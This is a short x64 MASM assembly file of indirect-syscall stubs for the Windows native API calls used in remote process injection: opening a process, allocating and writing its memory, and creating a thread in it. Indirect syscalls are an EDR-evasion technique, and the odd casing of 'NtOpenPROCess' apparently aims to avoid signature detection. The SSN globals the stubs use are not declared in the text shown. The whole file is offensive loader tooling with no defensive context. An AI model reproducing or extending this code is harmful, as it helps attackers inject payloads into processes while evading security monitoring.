.DATA 

;---------------------------------------------------------------
; INDIRECT SYSCALLS
extern g_NtOpenPROCessSyscall:QWORD
extern g_NtAllocateVirtualMemorySyscall:QWORD
extern g_NtWriteVirtualMemorySyscall:QWORD
extern g_NtCreateThreadExSyscall:QWORD
extern g_NtWaitForSingleObjectSyscall:QWORD
extern g_NtCloseSyscall:QWORD

.CODE
NtOpenPROCess PROC
		mov r10, rcx
		mov eax, g_NtOpenPROCessSSN       
		jmp qword ptr g_NtOpenPROCessSyscall                         
		ret                             
NtOpenPROCess ENDP

NtAllocateVirtualMemory PROC
		mov r10, rcx
		mov eax, g_NtAllocateVirtualMemorySSN      
		jmp qword ptr g_NtAllocateVirtualMemorySyscall                        
		ret                             
NtAllocateVirtualMemory ENDP

NtWriteVirtualMemory PROC
		mov r10, rcx
		mov eax, g_NtWriteVirtualMemorySSN      
		jmp qword ptr g_NtWriteVirtualMemorySyscall                        
		ret                             
NtWriteVirtualMemory ENDP

NtCreateThreadEx PROC
		mov r10, rcx
		mov eax, g_NtCreateThreadExSSN      
		jmp qword ptr g_NtCreateThreadExSyscall                        
		ret                             
NtCreateThreadEx ENDP

NtWaitForSingleObject PROC
		mov r10, rcx
		mov eax, g_NtWaitForSingleObjectSSN      
		jmp qword ptr g_NtWaitForSingleObjectSyscall                        
		ret                             
NtWaitForSingleObject ENDP

NtClose PROC
		mov r10, rcx
		mov eax, g_NtCloseSSN      
		jmp qword ptr g_NtCloseSyscall                        
		ret                             
NtClose ENDP
END